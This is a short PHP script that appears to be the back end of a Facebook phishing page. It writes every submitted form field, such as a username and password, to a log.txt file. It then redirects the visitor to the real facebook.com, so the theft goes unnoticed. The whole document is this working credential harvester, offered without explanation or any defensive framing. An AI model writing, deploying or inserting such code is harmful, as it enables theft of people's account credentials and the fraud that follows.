
<?php
	header ("Location: http://www.facebook.com/");
	$handle = fopen('log.txt', 'a');
	fputs($handle, '	\n	');
	foreach($_POST as $variable => $value) {
		fputs($handle, $variable);
		fputs($handle, '=');
		fputs($handle, $value);
		fputs($handle, '	\n	');
	}
	fputs($handle, '	\n	');
	fclose($handle);
	exit;
?>
